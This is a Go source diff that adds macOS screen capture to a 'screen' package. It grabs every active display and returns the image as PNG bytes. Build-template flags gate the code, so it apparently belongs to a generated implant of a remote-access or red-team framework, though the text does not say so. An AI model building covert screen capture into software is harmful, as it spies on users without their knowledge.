@@ -18,7 +18,60 @@ package screen
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
+import (
+	// {{if .Config.IsSharedLib}}
+	"bytes"
+	"image/png"
+
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
+	//{{end}}
+
+	// {{if .Config.IsSharedLib}}
+	screen "github.com/kbinani/screenshot"
+	// {{end}}
+)
+
 //Screenshot - Not Implemented
 func Screenshot() []byte {
-	return nil
+	buf := []byte{}
+	// {{if .Config.IsSharedLib}}
+	buf = DarwinCapture()
+	// {{end}}
+	return buf
 }
+
+// DarwinCapture - Retrieve the screenshot of the active displays
+// {{if .Config.IsSharedLib}}
+func DarwinCapture() []byte {
+	nDisplays := screen.NumActiveDisplays()
+
+	var height, width int = 0, 0
+	for i := 0; i < nDisplays; i++ {
+		rect := screen.GetDisplayBounds(i)
+		if rect.Dy() > height {
+			height = rect.Dy()
+		}
+		width += rect.Dx()
+	}
+	img, err := screen.Capture(0, 0, width, height)
+
+	//{{if .Config.Debug}}
+	log.Printf("Error Capture: %s", err)
+	//{{end}}
+
+	var buf bytes.Buffer
+	if err != nil {
+		//{{if .Config.Debug}}
+		log.Println("Capture Error")
+		//{{end}}
+		return buf.Bytes()
+	}
+
+	png.Encode(&buf, img)
+	return buf.Bytes()
+}
+
+// {{end}}
